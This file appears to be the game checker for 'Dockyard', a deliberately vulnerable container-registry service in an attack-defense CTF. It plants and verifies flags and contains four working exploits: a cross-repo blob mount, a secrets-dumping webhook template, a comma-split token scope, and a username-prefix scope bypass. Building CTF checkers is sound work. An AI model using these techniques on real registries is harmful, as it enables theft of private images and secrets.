#!/usr/bin/env python3
"""Dockyard checker for H7CTF'26 finals (enochecker3 0.14)."""
import hashlib
import json
import random
import string
import time

import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals

SERVICE_PORT = 7005
checker = Enochecker("dockyard", SERVICE_PORT)

# ── helpers ───────────────────────────────────────────────────────────────────

def _rng(n=10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _client(host: str, timeout: float = 10.0) -> httpx.Client:
    return httpx.Client(base_url=f"http://{host}:{SERVICE_PORT}", timeout=timeout)

def _register(c: httpx.Client, user: str, pw: str):
    r = c.post("/api/users", json={"username": user, "password": pw})
    if r.status_code not in (201, 409):
        raise MumbleException(f"DOCKYARD-REG-01: register failed {r.status_code}")

def _login(c: httpx.Client, user: str, pw: str) -> str:
    try:
        r = c.post("/api/session", json={"username": user, "password": pw})
    except httpx.TransportError as e:
        raise OfflineException(f"DOCKYARD-LOGIN-01: {e}")
    if r.status_code != 200:
        raise MumbleException(f"DOCKYARD-LOGIN-02: login failed {r.status_code}")
    tok = r.json().get("token", "")
    if not tok:
        raise MumbleException("DOCKYARD-LOGIN-03: no token in response")
    return tok

def _oci_token(c: httpx.Client, user: str, pw: str, repo: str, actions: list[str]) -> str:
    scope = f"repository:{repo}:{','.join(actions)}"
    try:
        r = c.get("/token", auth=(user, pw), params={"scope": scope, "service": "dockyard"})
    except httpx.TransportError as e:
        raise OfflineException(f"DOCKYARD-TOKEN-01: {e}")
    if r.status_code != 200:
        raise MumbleException(f"DOCKYARD-TOKEN-02: token endpoint failed {r.status_code}")
    tok = r.json().get("token", "")
    if not tok:
        raise MumbleException("DOCKYARD-TOKEN-03: empty oci token")
    return tok

def _push_blob(c: httpx.Client, oci_tok: str, repo: str, data: bytes) -> str:
    digest = "sha256:" + hashlib.sha256(data).hexdigest()
    h = {"Authorization": f"Bearer {oci_tok}", "Content-Type": "application/octet-stream"}
    try:
        r = c.post(f"/v2/{repo}/blobs/uploads/", headers=h,
                   params={"digest": digest}, content=data)
    except httpx.TransportError as e:
        raise OfflineException(f"DOCKYARD-BLOB-01: {e}")
    if r.status_code != 201:
        raise MumbleException(f"DOCKYARD-BLOB-02: blob push failed {r.status_code}")
    return digest

def _push_manifest(c: httpx.Client, oci_tok: str, repo: str, tag: str,
                   blob_digest: str, blob_size: int) -> str:
    manifest = json.dumps({
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {
            "mediaType": "application/vnd.oci.image.config.v1+json",
            "digest": blob_digest, "size": blob_size,
        },
        "layers": [],
    }).encode()
    h = {
        "Authorization": f"Bearer {oci_tok}",
        "Content-Type": "application/vnd.oci.image.manifest.v1+json",
    }
    try:
        r = c.put(f"/v2/{repo}/manifests/{tag}", headers=h, content=manifest)
    except httpx.TransportError as e:
        raise OfflineException(f"DOCKYARD-MANIFEST-01: {e}")
    if r.status_code != 201:
        raise MumbleException(f"DOCKYARD-MANIFEST-02: manifest push failed {r.status_code}")
    return r.headers.get("Docker-Content-Digest", "")


# ── store 0: blob-store (private blob, attacked via cross-repo mount) ─────────

@checker.putflag(0)
async def putflag_blob(task: PutflagCheckerTaskMessage, db: ChainDB):
    host = task.address
    user = "u" + _rng(8)
    pw = _rng(16)
    repo_name = "r" + _rng(8)
    repo = f"{user}/{repo_name}"

    with _client(host) as c:
        _register(c, user, pw)
        tok = _login(c, user, pw)
        h = {"Authorization": f"Bearer {tok}"}

        try:
            r = c.post("/api/repos", json={"name": repo, "visibility": "private"}, headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-PUTFLAG-01: {e}")
        if r.status_code != 201:
            raise MumbleException(f"DOCKYARD-PUTFLAG-02: create repo failed {r.status_code}")

        oci_tok = _oci_token(c, user, pw, repo, ["push", "pull"])
        blob_data = task.flag.encode()
        digest = _push_blob(c, oci_tok, repo, blob_data)
        _push_manifest(c, oci_tok, repo, "latest", digest, len(blob_data))

    await db.set("blob", {"user": user, "pw": pw, "repo": repo, "digest": digest})
    # attackInfo: repo + digest visible via transparency log; pass both for checker use
    return {"repo": repo, "digest": digest}


@checker.getflag(0)
async def getflag_blob(task: GetflagCheckerTaskMessage, db: ChainDB):
    host = task.address
    try:
        d = await db.get("blob")
    except KeyError:
        raise MumbleException("DOCKYARD-GETFLAG-01: no db entry")

    with _client(host) as c:
        oci_tok = _oci_token(c, d["user"], d["pw"], d["repo"], ["pull"])
        try:
            r = c.get(
                f"/v2/{d['repo']}/blobs/{d['digest']}",
                headers={"Authorization": f"Bearer {oci_tok}"},
            )
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-GETFLAG-02: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-GETFLAG-03: blob pull failed {r.status_code}")
        if task.flag not in r.text:
            raise MumbleException("DOCKYARD-GETFLAG-04: flag not in blob")


# ── store 1: secret-store (DEPLOY_KEY, attacked via webhook template) ─────────

@checker.putflag(1)
async def putflag_secret(task: PutflagCheckerTaskMessage, db: ChainDB):
    host = task.address
    user = "u" + _rng(8)
    pw = _rng(16)
    repo_name = "r" + _rng(8)
    repo = f"{user}/{repo_name}"

    with _client(host) as c:
        _register(c, user, pw)
        tok = _login(c, user, pw)
        h = {"Authorization": f"Bearer {tok}"}

        # public repo: any user can create a watch, enabling the template exploit
        try:
            r = c.post("/api/repos", json={"name": repo, "visibility": "public"}, headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-PUTFLAG-11: {e}")
        if r.status_code != 201:
            raise MumbleException(f"DOCKYARD-PUTFLAG-12: create repo failed {r.status_code}")

        try:
            r = c.put(f"/api/repos/{user}/{repo_name}/secrets/DEPLOY_KEY",
                      json={"value": task.flag}, headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-PUTFLAG-13: {e}")
        if r.status_code != 204:
            raise MumbleException(f"DOCKYARD-PUTFLAG-14: set secret failed {r.status_code}")

    await db.set("secret", {"user": user, "pw": pw, "repo": repo})
    return {"repo": repo}  # attackInfo for exploit(1)


@checker.getflag(1)
async def getflag_secret(task: GetflagCheckerTaskMessage, db: ChainDB):
    host = task.address
    try:
        d = await db.get("secret")
    except KeyError:
        raise MumbleException("DOCKYARD-GETFLAG-11: no db entry")

    with _client(host) as c:
        tok = _login(c, d["user"], d["pw"])
        h = {"Authorization": f"Bearer {tok}"}
        ns, name = d["repo"].split("/", 1)

        try:
            r = c.get(f"/api/repos/{ns}/{name}/secrets", headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-GETFLAG-12: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-GETFLAG-13: get secrets failed {r.status_code}")
        if task.flag not in r.json().values():
            raise MumbleException("DOCKYARD-GETFLAG-14: flag not in secrets")


# ── noise ─────────────────────────────────────────────────────────────────────

@checker.putnoise(0)
async def putnoise_log(task: PutnoiseCheckerTaskMessage, db: ChainDB):
    host = task.address
    with _client(host) as c:
        try:
            r = c.get("/log/tree")
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-NOISE-01: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-NOISE-02: log/tree failed {r.status_code}")
        data = r.json()
        if "size" not in data:
            raise MumbleException("DOCKYARD-NOISE-03: bad tree response")
        await db.set("noise_size", data["size"])


@checker.getnoise(0)
async def getnoise_log(task: GetnoiseCheckerTaskMessage, db: ChainDB):
    host = task.address
    with _client(host) as c:
        try:
            r = c.get("/log/tree")
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-NOISE-11: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-NOISE-12: log/tree failed {r.status_code}")
        data = r.json()
        if "size" not in data or "root" not in data or "sig" not in data:
            raise MumbleException("DOCKYARD-NOISE-13: incomplete tree head")


# ── havoc ─────────────────────────────────────────────────────────────────────

@checker.havoc(0)
async def havoc_register_login(task: HavocCheckerTaskMessage):
    host = task.address
    user = "h" + _rng(8)
    pw = _rng(16)
    with _client(host) as c:
        _register(c, user, pw)
        tok = _login(c, user, pw)
        if not tok:
            raise MumbleException("DOCKYARD-HAVOC-01: empty token")


@checker.havoc(1)
async def havoc_v2_ping(task: HavocCheckerTaskMessage):
    host = task.address
    user = "h" + _rng(8)
    pw = _rng(16)
    with _client(host) as c:
        _register(c, user, pw)
        oci_tok = _oci_token(c, user, pw, f"{user}/probe", ["push"])
        try:
            r = c.get("/v2/", headers={"Authorization": f"Bearer {oci_tok}"})
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-HAVOC-11: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-HAVOC-12: /v2/ failed {r.status_code}")


# ── exploit 0: Store A V1 - cross-repo blob mount ────────────────────────────

@checker.exploit(0)
async def exploit_blob_mount(task: ExploitCheckerTaskMessage, db: ChainDB):
    """
    Bug: POST /v2/<dst>/blobs/uploads/?mount=<digest> mounts any globally-stored blob
    without checking pull permission on the source repo.
    attackInfo: {"repo": "victim/repo", "digest": "sha256:..."}
    """
    host = task.address
    attack_info = task.attack_info or {}
    victim_repo = attack_info.get("repo", "")
    victim_digest = attack_info.get("digest", "")
    if not victim_repo or not victim_digest:
        raise MumbleException("DOCKYARD-EXP0-01: missing attackInfo")

    atk_user = "a" + _rng(8)
    atk_pw = _rng(16)
    atk_repo = f"{atk_user}/dst"

    with _client(host) as c:
        _register(c, atk_user, atk_pw)
        oci_tok = _oci_token(c, atk_user, atk_pw, atk_repo, ["push", "pull"])
        h = {"Authorization": f"Bearer {oci_tok}"}

        # mount victim blob without pull permission on victim_repo
        try:
            r = c.post(f"/v2/{atk_repo}/blobs/uploads/", headers=h,
                       params={"mount": victim_digest, "from": victim_repo})
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP0-02: {e}")
        if r.status_code != 201:
            raise MumbleException(f"DOCKYARD-EXP0-03: mount failed {r.status_code}")

        try:
            r2 = c.get(f"/v2/{atk_repo}/blobs/{victim_digest}", headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP0-04: {e}")
        if r2.status_code != 200:
            raise MumbleException(f"DOCKYARD-EXP0-05: blob pull failed {r2.status_code}")
        return r2.text


# ── exploit 1: Store B V1 - webhook template secret leak ─────────────────────

@checker.exploit(1)
async def exploit_watch_template(task: ExploitCheckerTaskMessage, db: ChainDB):
    """
    Bug: webhook RepoView includes Secrets map; template renders all secrets.
    attackInfo: {"repo": "victim/repo"} - the public repo with DEPLOY_KEY set.
    """
    host = task.address
    attack_info = task.attack_info or {}
    victim_repo = attack_info.get("repo", "")
    if not victim_repo:
        raise MumbleException("DOCKYARD-EXP1-01: missing attackInfo")

    ns, name = victim_repo.split("/", 1)
    atk_user = "a" + _rng(8)
    atk_pw = _rng(16)

    with _client(host) as c:
        _register(c, atk_user, atk_pw)
        tok = _login(c, atk_user, atk_pw)
        h = {"Authorization": f"Bearer {tok}"}

        # create watch on the public victim repo with secrets-dumping template
        tmpl = "{{range $k,$v := .Secrets}}{{$k}}={{$v}} {{end}}"
        try:
            r = c.post(f"/api/repos/{ns}/{name}/watches",
                       json={"url": "", "template": tmpl}, headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP1-02: {e}")
        if r.status_code != 201:
            raise MumbleException(f"DOCKYARD-EXP1-03: create watch failed {r.status_code}")

        watch_id = r.json().get("id", "")
        if not watch_id:
            raise MumbleException("DOCKYARD-EXP1-04: no watch id")

        time.sleep(0.3)

        try:
            r2 = c.get(f"/api/repos/{ns}/{name}/watches/{watch_id}/deliveries", headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP1-05: {e}")
        if r2.status_code != 200:
            raise MumbleException(f"DOCKYARD-EXP1-06: deliveries failed {r2.status_code}")

        deliveries = r2.json()
        if not deliveries:
            raise MumbleException("DOCKYARD-EXP1-07: no deliveries")

        rendered = deliveries[0].get("rendered", "")
        # extract the flag from rendered secrets output
        import re
        m = re.search(r"H7CTF\{[A-Z2-7]{32}\}", rendered)
        if not m:
            raise MumbleException("DOCKYARD-EXP1-08: flag not found in delivery output")
        return m.group(0)


# ── exploit 2: Store A V2 - comma scope differential ─────────────────────────

@checker.exploit(2)
async def exploit_scope_comma(task: ExploitCheckerTaskMessage, db: ChainDB):
    """
    Bug: CheckAccess splits Name on comma, granting access to multiple repos.
    attackInfo: {"repo": "victim/repo", "digest": "sha256:..."}
    """
    host = task.address
    attack_info = task.attack_info or {}
    victim_repo = attack_info.get("repo", "")
    victim_digest = attack_info.get("digest", "")
    if not victim_repo or not victim_digest:
        raise MumbleException("DOCKYARD-EXP2-01: missing attackInfo")

    atk_user = "a" + _rng(8)
    atk_pw = _rng(16)
    atk_repo = f"{atk_user}/dst"

    with _client(host) as c:
        _register(c, atk_user, atk_pw)

        # atk_repo first: canAccess fallback sees parts[0]==atk_user and passes.
        # CheckAccess then splits "atk_repo,victim_repo" on comma, granting both.
        bad_scope = f"repository:{atk_repo},{victim_repo}:pull"
        try:
            r = c.get("/token", auth=(atk_user, atk_pw),
                      params={"scope": bad_scope, "service": "dockyard"})
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP2-02: {e}")
        if r.status_code != 200:
            raise MumbleException(f"DOCKYARD-EXP2-03: token failed {r.status_code}")

        oci_tok = r.json().get("token", "")
        try:
            r2 = c.get(f"/v2/{victim_repo}/blobs/{victim_digest}",
                       headers={"Authorization": f"Bearer {oci_tok}"})
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP2-04: {e}")
        if r2.status_code != 200:
            raise MumbleException(f"DOCKYARD-EXP2-05: blob pull failed {r2.status_code}")
        return r2.text


# ── exploit 3: Store B V2 - fine-token glob prefix bypass ────────────────────

@checker.exploit(3)
async def exploit_glob_scope(task: ExploitCheckerTaskMessage, db: ChainDB):
    """
    Bug: fine token scope check uses HasPrefix(pattern, user) not HasPrefix(pattern, user+"/").
    attackInfo: {"repo": "victim_ns/victim_repo"}
    """
    host = task.address
    attack_info = task.attack_info or {}
    victim_repo = attack_info.get("repo", "")
    if not victim_repo:
        raise MumbleException("DOCKYARD-EXP3-01: missing attackInfo")

    victim_ns = victim_repo.split("/")[0]
    if len(victim_ns) < 2:
        raise MumbleException("DOCKYARD-EXP3-02: victim ns too short for prefix attack")

    # Register as victim_ns[:-1] (one char shorter than victim_ns).
    # Bug: HasPrefix(pattern, user) where pattern="victim_ns/*" and user=victim_ns[:-1].
    # "victim_ns/*" starts with victim_ns[:-1] → scope is allowed.
    # globMatch("victim_ns/*", "victim_ns/repo") matches via prefix+empty-suffix rule.
    atk_user = victim_ns[:-1]
    atk_pw = _rng(16)

    with _client(host) as c:
        _register(c, atk_user, atk_pw)
        tok = _login(c, atk_user, atk_pw)
        h = {"Authorization": f"Bearer {tok}"}

        # scope pattern = "victim_ns/*": HasPrefix("victim_ns/*", atk_user) = TRUE
        scope = f"secrets:read:{victim_ns}/*"
        try:
            r = c.post("/api/tokens", json={"name": "wide", "scopes": [scope]}, headers=h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP3-03: {e}")
        if r.status_code != 201:
            raise MumbleException(f"DOCKYARD-EXP3-04: fine token failed {r.status_code} (need prefix match)")

        fine_tok = r.json().get("token", "")
        fine_h = {"Authorization": f"Bearer {fine_tok}"}

        ns, name = victim_repo.split("/", 1)
        try:
            r2 = c.get(f"/api/repos/{ns}/{name}/secrets", headers=fine_h)
        except httpx.TransportError as e:
            raise OfflineException(f"DOCKYARD-EXP3-05: {e}")
        if r2.status_code != 200:
            raise MumbleException(f"DOCKYARD-EXP3-06: get secrets failed {r2.status_code}")

        for v in r2.json().values():
            import re
            m = re.search(r"H7CTF\{[A-Z2-7]{32}\}", v)
            if m:
                return m.group(0)
        raise MumbleException("DOCKYARD-EXP3-07: flag not in secrets")


app = checker.app

if __name__ == "__main__":
    checker.run()
